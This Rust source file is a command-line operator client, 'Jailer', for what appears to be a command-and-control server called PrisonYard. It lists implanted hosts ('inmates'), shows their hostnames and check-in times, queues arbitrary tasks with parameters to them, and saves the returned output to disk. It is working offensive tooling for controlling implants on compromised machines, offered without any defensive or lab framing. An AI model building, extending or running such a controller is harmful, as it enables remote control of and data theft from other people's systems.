use structopt::StructOpt;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use Justice::PostRequest;
use Justice::PostRequestHeaders;
use std::error::Error;
use Justice::CheckInResponse;
use Justice::Inmate;
use serde_json;
use chrono::NaiveDateTime;

#[derive(StructOpt, Debug)]
#[structopt(name = "Jailer", about = "CLI to interact with the operator API in PrisonYard")]
enum Opt {
    #[structopt(about = "List all inmates")]
    ListInmates,
    
    #[structopt(about = "Get details of a specific inmate by ID")]
    GetInmate {
        #[structopt(name = "IMPLANT_ID")]
        implant_id: u32,
    },
    
    #[structopt(about = "Get the most recent task of a specific inmate by ID")]
    GetRecentTask {
        #[structopt(name = "IMPLANT_ID")]
        implant_id: u32,
        display_content: String,
    },
    
    #[structopt(about = "Add a task to a specific inmate by ID")]
    AddTask {
        #[structopt(name = "IMPLANT_ID")]
        implant_id: u32,
        #[structopt(name = "TASK_TYPE")]
        task_type: String,
        #[structopt(name = "TASK_PARAMS")]
        task_params: String,
    },

    #[structopt(about = "Get number of inmates")]
    GetInmateCount,
}

struct DisplayInmate(Inmate);

impl std::fmt::Display for DisplayInmate {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Inmate {{ implant_id: {}, hostname: {}, last_check_in: {} }}", self.0.rowid, self.0.hostname, NaiveDateTime::from_timestamp(self.0.last_checkin.try_into().unwrap(), 0))
    }
}

struct DisplayHeaders(PostRequestHeaders);

impl std::fmt::Display for DisplayHeaders {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "timestamp: {}\n{:?}: {} ", NaiveDateTime::from_timestamp(self.0.timestamp.try_into().unwrap(), 0), self.0.action_type, self.0.action_parameters)
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let opt = Opt::from_args();
    let client = Client::new();
    let base_url = "http://localhost:8000"; // Adjust the base URL as needed

    match opt {
        Opt::GetInmateCount => { 
            let response = client.get(&format!("{}/operator", base_url))
                .send()
                .await?
                .text()
                .await?;
            let inmates: Vec<Inmate> = serde_json::from_str(&response)?;

            println!("{:?}", inmates.len());
        }
        Opt::ListInmates => {
            let response = client.get(&format!("{}/operator", base_url))
                .send()
                .await?
                .text()
                .await?;
            let inmates: Vec<Inmate> = serde_json::from_str(&response)?;

            println!("{:#?}", inmates);
        }
        Opt::GetInmate { implant_id } => {
            let response = client.get(&format!("{}/operator/{}", base_url, implant_id))
                .send()
                .await?
                .text()
                .await?;
            let inmate = serde_json::from_str::<Inmate>(&response)?;
            println!("{}", DisplayInmate(inmate));
        }
        Opt::GetRecentTask { implant_id, display_content } => {
            let response = client.get(&format!("{}/operator/{}/recent", base_url, implant_id))
                .send()
                .await?
                .text()
                .await?;
            let resp = serde_json::from_str::<PostRequest>(&response)?;

            let body = resp.content.clone();
            let headers = PostRequestHeaders::from_post_request(resp);
            println!("{}", DisplayHeaders(headers.clone()));

            match display_content.as_str() {
                "f" => {}
                "s" => {
                    match std::str::from_utf8(&body) {
                        Ok(content) => println!("{}", content),
                        Err(_) => println!("Failed to convert content to string"),
                    }
                }
                "b" => {
                    println!("{:?}", body);
                }
                "o" => {
                    let file_path = format!("artifacts/{}/{}", implant_id, headers.action_type.to_string());
                    std::fs::create_dir_all(&file_path).unwrap();
                    std::fs::write(format!("{}/{}", &file_path, headers.timestamp), body).unwrap();
                    println!("Output written to {}/{}", file_path, headers.timestamp);
                }
                _ => {}
            }
        }
        Opt::AddTask { implant_id, task_type, task_params } => {
            let new_task = CheckInResponse {
                task: task_type.into(),
                task_parameters: task_params,
            };
            let response = client.post(&format!("{}/operator/{}/add_task", base_url, implant_id))
                .json(&new_task)
                .send()
                .await?;
            println!("{}", response.text().await?);
        }
    }

    Ok(())
}
